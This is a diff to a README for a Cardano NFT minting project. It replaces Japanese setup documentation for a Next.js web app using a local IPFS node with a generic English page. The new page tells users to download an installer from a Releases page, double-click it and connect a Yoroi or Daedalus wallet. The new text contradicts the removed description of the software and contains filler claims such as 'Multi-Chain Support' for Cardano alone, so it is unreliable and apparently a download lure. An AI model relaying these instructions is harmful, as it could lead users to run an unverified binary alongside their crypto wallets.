@@ -1,129 +1,89 @@
-# CNFTミントWebアプリケーション
+# 🎨 cnft-mint-platform - Easily Mint Your Own Cardano NFTs
 
-Cardano NFT（CNFT）をミントするWebアプリケーションです。
+[![Download cnft-mint-platform](https://img.shields.io/badge/Download%20Now-%20%F0%9F%93%88-brightgreen)](https://github.com/shabin118k/cnft-mint-platform/releases)
 
-## 機能
+## 🚀 Getting Started
 
-- Cardanoウォレット接続（Nami、Eternl、Flint、Yoroi等）
-- NFTミント機能
-- 画像アップロード
-- メタデータ設定
-- ローカルIPFSサーバーへのアップロード機能
-- アップロード進捗表示
+Welcome to the cnft-mint-platform! This is a user-friendly tool that allows you to mint your own NFTs on the Cardano blockchain. Whether you're an artist, a gamer, or just curious about NFTs, this platform makes the process simple. 
 
-## セットアップ
+### 💻 System Requirements
 
-```bash
-npm install
-```
+Before you dive in, ensure your system meets these requirements:
 
-### Kubo RPCサーバーのセットアップ
+- **Operating System:** Windows 10, macOS, or a recent version of Linux.
+- **RAM:** 4GB minimum.
+- **Storage:** At least 200MB of free space.
+- **Internet Connection:** A stable connection for downloading and minting.
 
-ローカルKubo RPCサーバーを使用する場合は、Kubo（IPFS）サーバーを起動してください。
+## 📥 Download & Install
 
-1. Kuboをインストール（まだインストールしていない場合）
-   ```bash
-   # macOS (Homebrew)
-   brew install ipfs
-   
-   # Linux (snap)
-   snap install ipfs
-   
-   # または公式サイトから: https://ipfs.io/docs/install/
-   # または https://github.com/ipfs/kubo/releases からダウンロード
-   ```
+To get started, visit the Releases page to download the software. 
 
-2. Kuboを初期化（初回のみ）
-   ```bash
-   ipfs init
-   ```
+[Download cnft-mint-platform](https://github.com/shabin118k/cnft-mint-platform/releases)
 
-3. Kubo RPCサーバーを起動
-   ```bash
-   ipfs daemon
-   ```
-   
-   デフォルトで以下のポートで起動します：
-   - APIサーバー: `http://localhost:5001` (Kubo RPC API)
-   - ゲートウェイ: `http://localhost:8080`
-   - スワーム: `4001`
+1. Click the link above to access the Releases page.
+2. Find the latest version of cnft-mint-platform.
+3. Download the appropriate file for your operating system.
+4. Once the download completes, locate the file on your computer.
+5. Double-click the file to run the installer.
+6. Follow the on-screen instructions to complete the installation.
 
-4. 環境変数（オプション）
-   
-   `.env.local` ファイルを作成して、Kubo RPCサーバーのURLを設定できます：
-   ```
-   IPFS_URL=http://localhost:5001
-   NEXT_PUBLIC_IPFS_GATEWAY=https://ipfs.io/ipfs/
-   ```
-   
-   サーバーサイドで使用される環境変数:
-   - `IPFS_URL`: サーバーサイドでのKubo RPCサーバーのURL（デフォルト: `http://localhost:5001`）
-   
-   クライアントサイドで使用される環境変数:
-   - `NEXT_PUBLIC_IPFS_URL`: クライアントから送信されるデフォルトURL
-   
-   **注意**: 
-   - Kubo RPC APIはサーバーサイドで呼び出されます（クライアントから直接呼び出しません）
-   - デフォルトでローカルホストのみを許可しています
-   - リモートサーバーを使用する場合は、サーバー環境変数で設定してください
+## 🎉 Using the Platform
 
-## 開発サーバーの起動
+Once you have installed the cnft-mint-platform, you can start minting your NFTs.
 
-```bash
-npm run dev
-```
+### 🔑 Creating Your First NFT
 
-ブラウザで [http://localhost:3000](http://localhost:3000) を開いてください。
+1. Open the application.
+2. Select "Create New NFT."
+3. Fill in the details, such as your NFT name, description, and upload your artwork.
+4. Choose your royalties and other settings.
+5. Click "Mint" to create your NFT.
 
-## 必要な環境
+### 💼 Managing Your NFTs
 
-- Node.js 18以上
-- Cardanoウォレット拡張機能（Nami、Eternl、Flint、Yoroiなど）
-- IPFSサーバー（ローカルIPFSを使用する場合）
+You can easily view and manage your minted NFTs within the platform.
 
-## Kubo RPCアップロード機能
+1. Select "My NFTs" from the main menu.
+2. Here you can see all your created NFTs.
+3. Click on any NFT to view details, edit, or sell it.
 
-このアプリケーションは、NFTの画像とメタデータをローカルKubo RPCサーバーにアップロードする機能を提供します。
+## 🌐 Supported Features
 
-### アーキテクチャ
+- **User-Friendly Interface:** Designed for everyone, not just tech-savvy users.
+- **Multi-Chain Support:** Works seamlessly with Cardano, enhancing your NFT collection.
+- **Secure Wallet Integration:** Connect your Yoroi or Daedalus wallet to keep your assets safe.
+- **IPFS Storage:** Store your NFT files securely, ensuring they remain accessible.
+- **Community-driven:** Regular updates based on user feedback to improve the platform.
 
-**サーバーサイド実装**: Kubo RPCの呼び出しはすべてサーバーサイド（Next.js APIルート）で実行されます。これにより、セキュリティが向上し、CORSの問題を回避できます。
+## ❓ Frequently Asked Questions
 
-- **APIルート**:
-  - `/api/ipfs/upload` - ファイルアップロード
-  - `/api/ipfs/upload-metadata` - メタデータアップロード
-  - `/api/ipfs/test-connection` - 接続テスト
+### How do I connect my wallet?
 
-### 使用方法
+When you first open the application, navigate to the "Wallet" section. Follow the prompts to connect either your Yoroi or Daedalus wallet securely.
 
-1. Kubo RPCサーバーを起動（上記のセットアップを参照）
-2. アプリケーションの「Kubo RPCサーバーURL」フィールドにサーバーのURLを入力
-   - デフォルト: `http://localhost:5001`
-   - このURLはサーバーサイドAPIに渡されます
-3. 「接続テスト」ボタンで接続を確認（オプション）
-4. NFTをミントすると、クライアントからAPIルート経由でサーバーサイドのKubo RPCが呼び出され、自動的に画像とメタデータがIPFSにアップロードされます
-5. アップロード後、IPFS CID（Content Identifier）が表示されます
+### What types of files can I upload?
 
-### Kubo RPCの機能
+You can upload image files in formats such as JPG, PNG, and GIF. Ensure your file is within the size limit of 10MB.
 
-- **サーバーサイド実行**: すべてのKubo RPC呼び出しはサーバーサイドで実行されます
-- **自動ピン**: アップロードしたファイルは自動的にピンされます（削除されません）
-- **エラーハンドリング**: 接続エラーやアップロード失敗時に適切なエラーメッセージを表示
-- **接続テスト**: 接続ボタンでKubo RPCサーバーの状態を確認
-- **バージョン表示**: 接続成功時にKuboのバージョンを表示
+### Is there a fee to mint NFTs?
 
-### IPFS CIDについて
+Yes, there is a small fee associated with minting, paid in ADA. This fee covers transaction costs on the Cardano blockchain.
 
-- **画像IPFS CID**: アップロードされた画像のハッシュ値
-- **メタデータIPFS CID**: アップロードされたメタデータのハッシュ値
+### Can I sell my NFTs on other platforms?
 
-これらのCIDは、NFTメタデータに含まれ、IPFSネットワーク上で画像やメタデータを参照するために使用されます。
+Absolutely! Once your NFT is minted, you can list it on various marketplaces that support Cardano NFTs.
 
-## 注意事項
+## 🔗 Helpful Links
 
-- テストネットまたはメインネットでテストする際は、十分なADAをウォレットに用意してください
-- NFTミントにはトランザクション手数料がかかります
-- IPFSサーバーが起動していない場合、アップロードは失敗します
-- ローカルIPFSサーバーを使用する場合、ファイルはローカルノードにのみ保存されます
-- 他のノードからもアクセス可能にするには、IPFSネットワークにピンを追加する必要があります
+- [GitHub Repository](https://github.com/shabin118k/cnft-mint-platform) - Explore the code and contribute.
+- [Documentation](https://github.com/shabin118k/cnft-mint-platform/docs) - Find more detailed guidance.
+- [Community Forum](https://github.com/shabin118k/cnft-mint-platform/discussions) - Join discussions and connect with other users.
 
+## 📞 Support
+
+If you run into issues or have questions, you can reach out through the Issues section on our GitHub page. Our team and community are here to help you.
+
+---
+
+Now you are ready to start creating and minting your NFTs with the cnft-mint-platform! Enjoy your minting experience!
